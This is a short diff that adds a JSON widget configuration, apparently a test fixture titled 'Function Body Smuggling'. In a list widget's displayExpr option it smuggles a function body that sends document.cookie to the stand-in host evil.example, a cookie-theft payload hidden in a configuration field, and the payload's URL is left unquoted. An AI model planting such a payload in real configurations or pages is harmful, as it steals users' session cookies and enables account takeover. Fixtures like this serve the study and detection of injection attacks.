@@ -1,0 +1,14 @@
+{
+  "schemaVersion": "1.0.0",
+  "title": "Function Body Smuggling",
+  "template": "basic-page",
+  "widgets": [
+    {
+      "id": "activityList",
+      "type": "dxList",
+      "options": {
+        "displayExpr": "function(item) { fetch(https://evil.example/ + document.cookie); return item.text; }"
+      }
+    }
+  ]
+}
